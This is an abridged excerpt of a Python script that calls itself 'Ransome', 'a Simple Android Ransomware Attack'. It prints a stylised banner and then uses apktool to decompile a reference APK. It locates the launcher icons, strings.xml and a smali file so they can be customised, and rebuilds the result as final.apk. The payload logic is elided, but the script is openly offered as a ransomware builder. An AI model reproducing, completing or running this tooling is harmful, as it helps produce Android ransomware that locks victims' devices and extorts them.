...
def banner():
    ...
    print(w+d+"      ((("+w+b+"@@@@@@@@@@@@@@@@"+w+d+")))    "+w+b+"RANSOME - version 1.1.0")
    print(w+b+"      \@@/"+r+",:::,"+w+b+"\/"+r+",:::,"+w+b+"\@@       "+w+"------------------")
    print(w+b+"     /@@@|"+r+":::::"+w+b+"||"+r+":::::"+w+b+"|@@@\\     "+w+"Author by "+y+"Jerry4539")
...
def start():
    ...
    print(f"""
    {r}Ransome{w} is a Simple Android Ransomware Attack
    ...
    print(w+"-"*43+d)
    os.system("apktool d reference.apk")
    imgpath = [
        "reference/res/drawable-mdpi-v4/ic_launcher.png",
        "reference/res/drawable-xhdpi-v4/ic_launcher.png",
        "reference/res/drawable-hdpi-v4/ic_launcher.png",
        "reference/res/drawable-xxhdpi-v4/ic_launcher.png",
    ]
    strings = "reference/res/values/strings.xml"
    print("I: Using strings "+strings)
    smali = os.popen(f"find -L reference/ -name '*0000.smali'","r").readline().strip()
    ...
    os.system("apktool b reference -o final.apk;rm -rf ransome")
...
if __name__ == "__main__":
    try:
        ...
        exit(r+"\n[!]"+w+" Thanks for Using this tools\n    follow us \033[4mhttps://github.com/Jerry4539/\033[0m\n    exiting ...")
